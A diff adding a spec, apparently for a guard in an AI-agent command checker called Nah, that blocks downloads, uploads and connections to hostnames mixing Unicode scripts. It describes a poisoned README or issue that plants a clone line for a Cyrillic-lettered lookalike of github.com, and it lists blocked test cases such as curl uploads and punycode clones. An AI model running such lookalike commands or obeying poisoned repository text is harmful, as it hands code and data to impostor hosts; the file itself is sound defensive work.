@@ -1,0 +1,72 @@
+summary = "Blocks network access to a hostname that mixes scripts to imitate another."
+
+description = '''
+This guard stops the agent from contacting a host whose name is built to pass
+for a trusted one. A poisoned README or issue can carry an install or clone
+line such as `git clone https://gіthub.com/org/repo`, where the `і` is
+Cyrillic: the name reads as GitHub, but it resolves to whoever registered it.
+It blocks any modeled download, upload, connection, or listener whose host has
+a DNS label that mixes Unicode scripts, following UTS #39. Digits, hyphens and
+combining marks belong to every script, Han written with Hiragana, Katakana,
+Hangul or Bopomofo counts as one writing system, and a punycode (`xn--`) label
+is decoded before it is judged. A fetch from the same host blocks inside
+`sh -c` and in a `||` fallback too.
+'''
+
+limits = '''
+Nah judges the host the command names, with no reputation data or network
+lookup, so an all-Latin typo domain or a single-script lookalike such as an
+all-Cyrillic `аррӏе.com` passes. A host Nah cannot recover, such as a URL in
+an unset variable or the VCS URL of `pip install git+https://…`, delegates.
+'''
+
+default_reason = '''
+It ships on because development work almost never needs a mixed-script
+hostname, and the deception is invisible when the command is reviewed.
+`exec-remote` blocks only when fetched code is executed, and `secrets-exfil`
+only when sensitive data is sent; neither covers contact with an impostor
+host.
+'''
+
+[[blocks]]
+row = "net-lookalike-host.git-clone-cyrillic-i"
+why = "The host's `і` is Cyrillic U+0456 among Latin letters."
+tui = true
+
+[[blocks]]
+row = "net-lookalike-host.curl-output-download"
+why = "curl saves a download from the mixed-script host."
+tui = true
+
+[[blocks]]
+row = "net-lookalike-host.curl-upload"
+why = "-T uploads a file to the mixed-script host."
+
+[[blocks]]
+row = "net-lookalike-host.punycode-git-clone"
+why = "xn--gthub-n2e decodes to the same Latin and Cyrillic label."
+tui = true
+
+[[blocks]]
+row = "net-lookalike-host.fallback-clone-mirror"
+why = "The clone after || reaches the mixed-script host when the first one fails."
+
+[[passes]]
+row = "net-lookalike-host.ascii-host-delegates"
+why = "github.com is all Latin."
+cause = "out-of-scope"
+
+[[passes]]
+row = "net-lookalike-host.latin-idn-delegates"
+why = "münchen is an internationalized label written entirely in Latin."
+cause = "out-of-scope"
+
+[[passes]]
+row = "net-lookalike-host.cyrillic-idn-delegates"
+why = "пример and рф are each written entirely in Cyrillic."
+cause = "out-of-scope"
+
+[[passes]]
+row = "net-lookalike-host.japanese-idn-delegates"
+why = "Han, Hiragana and Katakana together are one writing system, Japanese."
+cause = "out-of-scope"
